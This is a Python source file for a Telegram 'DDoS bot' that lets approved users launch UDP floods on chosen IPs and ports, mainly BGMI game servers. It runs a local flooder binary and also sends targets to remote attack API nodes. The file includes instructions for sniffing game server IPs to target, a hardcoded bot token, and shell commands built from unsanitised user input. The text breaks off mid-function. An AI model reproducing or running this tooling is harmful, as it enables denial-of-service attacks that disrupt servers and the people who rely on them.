#!/usr/bin/env python3
import telebot
import subprocess
import threading
import time
import os
import json
import requests
from datetime import datetime
import random
import string

# ============================================
# CONFIGURATION
# ============================================
TOKEN = '8669620625:AAGAq4R4gcHTNM9QHTZ0ladGmFML9oGv8'
ADMIN_ID = 1917682089
OWNER = '@Prime_X_Army'
BGMI_PATH = './bgmi'
MAX_ATTACKS = 10
MAX_DURATION = 600
DEFAULT_THREADS = 1500

CONFIG_FILE = 'api_config.json'

# Canary Download Links
CANARY_ANDROID = "https://httpcanary.com/download"
CANARY_IOS = "https://apps.apple.com/app/http-canary/id1457774120"
CANARY_WINDOWS = "https://www.telerik.com/fiddler"
CANARY_MAC = "https://www.charlesproxy.com/download/"

# ============================================
# API ENDPOINTS MANAGEMENT
# ============================================
def load_apis():
    try:
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
            return config.get('api_endpoints', [])
    except:
        return []

def save_apis(apis):
    with open(CONFIG_FILE, 'w') as f:
        json.dump({'api_endpoints': apis}, f, indent=2)

API_ENDPOINTS = load_apis()

# ============================================
# TELEGRAM BOT
# ============================================
bot = telebot.TeleBot(TOKEN)

# Store active attacks
active_attacks = {}
attack_lock = threading.Lock()
attack_counter = 0
user_stats = {}

# Approved users
approved_users = set()
APPROVED_FILE = "approved.json"

def load_approved():
    try:
        with open(APPROVED_FILE, 'r') as f:
            return set(json.load(f))
    except FileNotFoundError:
        # File nahi hai toh create kar
        with open(APPROVED_FILE, 'w') as f:
            json.dump([], f)
        return set()
    except:
        return set()

def save_approved():
    with open(APPROVED_FILE, 'w') as f:
        json.dump(list(approved_users), f)

approved_users = load_approved()

def get_active_count():
    with attack_lock:
        now = datetime.now()
        return len([a for a in active_attacks.values() if a['end_time'] > now])

def get_free_slots():
    return MAX_ATTACKS - get_active_count()

def update_user_stats(user_id, ip, port, duration, method):
    if user_id not in user_stats:
        user_stats[user_id] = {'total': 0, 'today': 0, 'last_reset': datetime.now().date()}
    
    if user_stats[user_id]['last_reset'] != datetime.now().date():
        user_stats[user_id]['today'] = 0
        user_stats[user_id]['last_reset'] = datetime.now().date()
    
    user_stats[user_id]['total'] += 1
    user_stats[user_id]['today'] += 1

def get_user_stats(user_id):
    if user_id not in user_stats:
        return {'total': 0, 'today': 0}
    return user_stats[user_id]

# ============================================
# ATTACK METHODS
# ============================================

def run_attack_normal(attack_id, ip, port, duration, username, chat_id):
    try:
        def call_apis():
            for endpoint in API_ENDPOINTS:
                try:
                    url = f"https://{endpoint}/start-server"
                    requests.post(url, json={"ip": ip, "port": port, "duration": duration, "threads": 6}, timeout=5)
                except:
                    pass
        
        api_thread = threading.Thread(target=call_apis)
        api_thread.start()
        
        cmd = f"{BGMI_PATH} {ip} {port} {duration} 500"
        print(f"[+] Executing: {cmd}")
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(duration)
        process.terminate()
        
        slots = get_free_slots()
        bot.send_message(chat_id,
            f"✅ *Attack Completed!*\n\n"
            f"🎯 *Target:* `{ip}:{port}`\n"
            f"⏰ *Duration:* `{duration}s`\n"
            f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
            f"👑 {OWNER}",
            parse_mode='Markdown')
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ *Attack failed:* `{str(e)}`", parse_mode='Markdown')
    finally:
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]

def run_attack_bgmi(attack_id, ip, port, duration, username, chat_id):
    try:
        cmd = f"{BGMI_PATH} {ip} {port} {duration} 1500"
        print(f"[+] BGMI Attack: {cmd}")
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(duration)
        process.terminate()
        
        slots = get_free_slots()
        bot.send_message(chat_id,
            f"✅ *BGMI Attack Completed!*\n\n"
            f"🎯 *Target:* `{ip}:{port}`\n"
            f"⏰ *Duration:* `{duration}s`\n"
            f"🧵 *Threads:* `1500`\n"
            f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
            f"👑 {OWNER}",
            parse_mode='Markdown')
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ *Attack failed:* `{str(e)}`", parse_mode='Markdown')
    finally:
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]

def run_attack_multi(attack_id, ip, port, duration, username, chat_id):
    try:
        ports = [27015, 27016, 27017, 27018, 27019, 27020]
        for p in ports:
            cmd = f"{BGMI_PATH} {ip} {p} {duration} 800"
            subprocess.Popen(cmd, shell=True)
        
        time.sleep(duration)
        
        slots = get_free_slots()
        bot.send_message(chat_id,
            f"✅ *Multi-Port Attack Completed!*\n\n"
            f"🎯 *Target:* `{ip}`\n"
            f"🔌 *Ports:* `{ports[0]}-{ports[-1]}`\n"
            f"⏰ *Duration:* `{duration}s`\n"
            f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
            f"👑 {OWNER}",
            parse_mode='Markdown')
        
    except Exception as e:
        bot.send_message(chat_id, f"❌ *Attack failed:* `{str(e)}`", parse_mode='Markdown')
    finally:
        with attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]

# ============================================
# BOT COMMANDS
# ============================================

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    name = message.from_user.username or message.from_user.first_name
    is_admin = uid == ADMIN_ID
    is_approved = is_admin or uid in approved_users
    
    status = "👑 ADMIN" if is_admin else ("✅ APPROVED" if is_approved else "⏳ PENDING")
    
    msg = f"""
🔥 *PRIME ONYX DDoS Bot* 🔥

👤 *User:* @{name}
📊 *Status:* {status}
📡 *API Nodes:* {len(API_ENDPOINTS)}
⚡ *Max Attacks:* {MAX_ATTACKS}
⏰ *Max Duration:* {MAX_DURATION}s

📌 *Commands:*

🎮 *Game Attacks:*
• `/bgmi IP PORT TIME` - BGMI game attack (1500 threads)
• `/multiport IP TIME` - Multi-port attack (6 ports)
• `/game IP TIME` - Auto-detect game attack

⚡ *Normal Attacks:*
• `/attack IP PORT TIME` - Normal UDP attack
• `/strong IP PORT TIME` - High power attack (2000 threads)

🐦 *Canary Download:*
• `/canary` - Download HttpCanary (Android)
• `/ios` - Download for iOS
• `/windows` - Download for Windows
• `/mac` - Download for Mac

🔧 *Admin Commands:*
• `/addapi <endpoint>` - Add API endpoint
• `/removeapi <endpoint>` - Remove API endpoint
• `/listapis` - List all APIs
• `/approve <user_id>` - Approve user
• `/remove <user_id>` - Remove user
• `/broadcast <msg>` - Send to all
• `/stats` - Bot statistics

👤 *User Commands:*
• `/status` - Bot status
• `/myinfo` - Your info
• `/mystats` - Your attack stats

👑 *Owner:* {OWNER}

💡 *Example:* `/bgmi 1.1.1.1 27015 60`
"""
    bot.reply_to(message, msg, parse_mode='Markdown')

# ============================================
# CANARY DOWNLOAD COMMANDS
# ============================================

@bot.message_handler(commands=['canary'])
def canary_download(message):
    msg = f"""
🐦 *HttpCanary Download* 🐦

*Android:*
📱 `{CANARY_ANDROID}`

*Features:*
• 🔍 Packet Capture & Analysis
• 📊 Network Debugging
• 🔒 HTTPS Decryption
• 📡 API Testing
• 🎮 Game Packet Sniffing

*How to use:*
1. Download HttpCanary from link above
2. Install CA Certificate
3. Start capturing packets
4. Find game server IPs

*Note:* Use for educational purposes only!

👑 {OWNER}
"""
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['ios'])
def ios_download(message):
    msg = f"""
🍎 *iOS Packet Capture Tools* 🍎

*HttpCanary for iOS:*
📱 `{CANARY_IOS}`

*Alternatives:*
• Stream - Network Debug Tool
• Charles Proxy
• Surge
• Quantumult X

*How to install:*
1. Open App Store
2. Search "Http Canary"
3. Download and install
4. Configure VPN settings

*Note:* iOS requires VPN configuration for packet capture

👑 {OWNER}
"""
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['windows'])
def windows_download(message):
    msg = f"""
🪟 *Windows Packet Capture Tools* 🪟

*Fiddler Classic:*
📱 `{CANARY_WINDOWS}`

*Alternatives:*
• Wireshark (Full packet analysis)
• Burp Suite (Security testing)
• Postman (API testing)
• Charles Proxy

*How to use Fiddler:*
1. Download Fiddler from link above
2. Install and run
3. Enable HTTPS decryption
4. Start capturing traffic

*For BGMI packet capture:*
• Use Wireshark for UDP packets
• Filter: `udp.port == 27015`

👑 {OWNER}
"""
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['mac'])
def mac_download(message):
    msg = f"""
🍎 *Mac Packet Capture Tools* 🍎

*Charles Proxy:*
📱 `{CANARY_MAC}`

*Alternatives:*
• Proxyman (Native Mac app)
• Wireshark
• Little Snitch
• Reveal

*How to use Charles:*
1. Download Charles from link above
2. Install and run
3. Enable SSL proxying
4. Install Charles certificate

*For game packet capture:*
• Set up proxy on device
• Monitor game traffic
• Extract server IPs

👑 {OWNER}
"""
    bot.reply_to(message, msg, parse_mode='Markdown')

@bot.message_handler(commands=['capture'])
def capture_guide(message):
    msg = f"""
📡 *How to Capture Game Server IPs* 📡

*Method 1: HttpCanary (Android)*
1. Download HttpCanary from /canary
2. Install CA certificate
3. Start BGMI game
4. Look for UDP packets on ports 27015-27020

*Method 2: Wireshark (PC)*
1. Download Wireshark
2. Start capture on WiFi interface
3. Filter: `udp.port >= 27015 and udp.port <= 27020`
4. Note destination IPs

*Method 3: Netstat (Android)*
1. Install Termux
2. Run: `netstat -an | grep ESTABLISHED`
3. Look for game server connections

*Found IP Format:* `xxx.xxx.xxx.xxx:27015`

*Attack Command:*
`/bgmi [IP] 27015 60`

👑 {OWNER}
"""
    bot.reply_to(message, msg, parse_mode='Markdown')

# ============================================
# ATTACK COMMANDS
# ============================================

@bot.message_handler(commands=['attack'])
def attack_normal(message):
    global attack_counter
    uid = message.from_user.id
    name = message.from_user.username or message.from_user.first_name
    
    if uid != ADMIN_ID and uid not in approved_users:
        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode='Markdown')
        return
    
    if get_free_slots() <= 0:
        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode='Markdown')
        return
    
    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(message, "❌ *Usage:* `/attack IP PORT TIME`\n📌 Example: `/attack 1.1.1.1 80 60`", parse_mode='Markdown')
            return
        
        ip, port, duration = args
        duration = int(duration)
        
        if duration < 10 or duration > MAX_DURATION:
            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode='Markdown')
            return
        
        parts = ip.split('.')
        if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
            bot.reply_to(message, "❌ *Invalid IP address!*", parse_mode='Markdown')
            return
        
        with attack_lock:
            attack_counter += 1
            attack_id = attack_counter
            active_attacks[attack_id] = {
                'user_id': uid,
                'username': name,
                'target': f"{ip}:{port}",
                'end_time': datetime.now(),
                'duration': duration
            }
        
        update_user_stats(uid, ip, port, duration, "normal")
        slots = get_free_slots()
        
        bot.reply_to(message,
            f"🚀 *Normal Attack Initiated!*\n\n"
            f"🎯 *Target:* `{ip}:{port}`\n"
            f"⏰ *Duration:* `{duration}s`\n"
            f"🧵 *Threads:* `500`\n"
            f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
            f"⚡ *Attack running...*",
            parse_mode='Markdown')
        
        thread = threading.Thread(target=run_attack_normal, args=(attack_id, ip, port, duration, name, message.chat.id))
        thread.daemon = True
        thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode='Markdown')

@bot.message_handler(commands=['bgmi'])
def attack_bgmi(message):
    global attack_counter
    uid = message.from_user.id
    name = message.from_user.username or message.from_user.first_name
    
    if uid != ADMIN_ID and uid not in approved_users:
        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode='Markdown')
        return
    
    if get_free_slots() <= 0:
        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode='Markdown')
        return
    
    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(message, 
                "❌ *Usage:* `/bgmi IP PORT TIME`\n"
                "📌 *Example:* `/bgmi 1.1.1.1 27015 60`\n\n"
                "🎮 *BGMI Ports:* 27015, 27016, 27017, 27018, 27019, 27020",
                parse_mode='Markdown')
            return
        
        ip, port, duration = args
        duration = int(duration)
        
        if duration < 10 or duration > MAX_DURATION:
            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode='Markdown')
            return
        
        parts = ip.split('.')
        if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
            bot.reply_to(message, "❌ *Invalid IP address!*", parse_mode='Markdown')
            return
        
        with attack_lock:
            attack_counter += 1
            attack_id = attack_counter
            active_attacks[attack_id] = {
                'user_id': uid,
                'username': name,
                'target': f"{ip}:{port}",
                'end_time': datetime.now(),
                'duration': duration
            }
        
        update_user_stats(uid, ip, port, duration, "bgmi")
        slots = get_free_slots()
        
        bgmi_ports = [27015, 27016, 27017, 27018, 27019, 27020]
        port_msg = "🎯 *BGMI Port Detected!*" if int(port) in bgmi_ports else ""
        
        bot.reply_to(message,
            f"🚀 *BGMI Attack Initiated!*\n\n"
            f"🎯 *Target:* `{ip}:{port}`\n"
            f"⏰ *Duration:* `{duration}s`\n"
            f"🧵 *Threads:* `1500` (MAX POWER)\n"
            f"{port_msg}\n"
            f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
            f"⚡ *Game server flooding...*",
            parse_mode='Markdown')
        
        thread = threading.Thread(target=run_attack_bgmi, args=(attack_id, ip, port, duration, name, message.chat.id))
        thread.daemon = True
        thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode='Markdown')

@bot.message_handler(commands=['multiport'])
def attack_multiport(message):
    global attack_counter
    uid = message.from_user.id
    name = message.from_user.username or message.from_user.first_name
    
    if uid != ADMIN_ID and uid not in approved_users:
        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode='Markdown')
        return
    
    if get_free_slots() <= 0:
        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode='Markdown')
        return
    
    try:
        args = message.text.split()[1:]
        if len(args) != 2:
            bot.reply_to(message, "❌ *Usage:* `/multiport IP TIME`\n📌 Example: `/multiport 1.1.1.1 60`\n\n🎮 *Attacks 6 ports simultaneously*", parse_mode='Markdown')
            return
        
        ip, duration = args
        duration = int(duration)
        
        if duration < 10 or duration > MAX_DURATION:
            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode='Markdown')
            return
        
        with attack_lock:
            attack_counter += 1
            attack_id = attack_counter
            active_attacks[attack_id] = {
                'user_id': uid,
                'username': name,
                'target': f"{ip}:MULTI",
                'end_time': datetime.now(),
                'duration': duration
            }
        
        update_user_stats(uid, ip, 0, duration, "multiport")
        slots = get_free_slots()
        
        bot.reply_to(message,
            f"🚀 *Multi-Port Attack Initiated!*\n\n"
            f"🎯 *Target:* `{ip}`\n"
            f"🔌 *Ports:* `27015-27020` (6 ports)\n"
            f"⏰ *Duration:* `{duration}s`\n"
            f"🧵 *Threads per port:* `800`\n"
            f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
            f"⚡ *Multi-port flooding...*",
            parse_mode='Markdown')
        
        thread = threading.Thread(target=run_attack_multi, args=(attack_id, ip, 0, duration, name, message.chat.id))
        thread.daemon = True
        thread.start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ *Error:* `{str(e)}`", parse_mode='Markdown')

@bot.message_handler(commands=['strong'])
def attack_strong(message):
    global attack_counter
    uid = message.from_user.id
    name = message.from_user.username or message.from_user.first_name
    
    if uid != ADMIN_ID and uid not in approved_users:
        bot.reply_to(message, "❌ *Not approved!* Contact @Prime_X_Army", parse_mode='Markdown')
        return
    
    if get_free_slots() <= 0:
        bot.reply_to(message, f"❌ *No free slots!* Max {MAX_ATTACKS} attacks running", parse_mode='Markdown')
        return
    
    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            bot.reply_to(message, "❌ *Usage:* `/strong IP PORT TIME`\n📌 Example: `/strong 1.1.1.1 80 60`\n\n⚡ *2000 threads maximum power*", parse_mode='Markdown')
            return
        
        ip, port, duration = args
        duration = int(duration)
        
        if duration < 10 or duration > MAX_DURATION:
            bot.reply_to(message, f"❌ *Duration must be 10-{MAX_DURATION} seconds*", parse_mode='Markdown')
            return
        
        with attack_lock:
            attack_counter += 1
            attack_id = attack_counter
            active_attacks[attack_id] = {
                'user_id': uid,
                'username': name,
                'target': f"{ip}:{port}",
                'end_time': datetime.now(),
                'duration': duration
            }
        
        update_user_stats(uid, ip, port, duration, "strong")
        slots = get_free_slots()
        
        bot.reply_to(message,
            f"💥 *Strong Attack Initiated!*\n\n"
            f"🎯 *Target:* `{ip}:{port}`\n"
            f"⏰ *Duration:* `{duration}s`\n"
            f"🧵 *Threads:* `2000` (ULTIMATE POWER)\n"
            f"🟢 *Free Slots:* `{slots}/{MAX_ATTACKS}`\n\n"
            f"⚡ *Maximum force attack...*",
            parse_mode='Markdown')
        
        def ru
